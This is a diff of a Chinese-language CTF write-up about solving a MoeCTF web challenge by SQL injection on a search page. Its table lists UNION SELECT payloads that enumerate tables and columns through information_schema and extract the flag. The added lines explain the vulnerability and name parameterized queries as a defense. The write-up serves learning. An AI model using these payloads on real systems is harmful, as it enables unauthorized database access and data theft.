@@ -12,11 +12,9 @@ draft: false
 
 第一次在网课外接触sql注入漏洞还是有点迷茫的
 
-但是借助ai还是有一战之力的
-
 主要就是对mysql太陌生了，构造payload的时候有很多地方都很迷茫
 
-咋确认是sql注入就不写了
+就个查询搜索页面，想sql注入
 
 ## 构造payload
 排除sqlite试mysql
@@ -69,3 +67,11 @@ SELECT 1,'x',table_name看库里有什么表名，FROM information_schema.tables
 | 6 | 查表 | `0 UNION SELECT 1,'x',table_name FROM information_schema.tables WHERE table_schema='past_paper'` | 三张表名 |
 | 7 | 查列 | `0 UNION SELECT 1,'x',column_name FROM information_schema.columns WHERE table_schema='past_paper' AND table_name='flag_table'` | id / flag |
 | 8 | 取数据 | `0 UNION SELECT 1,'x',flag FROM flag_table` | moectf{...} |
+
+666这周任务是学你啊sql
+sql注入是用户的恶意输入被数据库端当成sql执行，从而改变了原有的语义，导致绕过登录，窃取数据库数据等，可以使用参数化查询，输入校验啥的来防御
+看题就个登录框，搜索框啥的一般都要想一下sql注入
+现在还是太吃力了，在看mysql必知必会
+靶场就当打过一遍了，以后再深造，先把moectf的web方向全解了
+
+
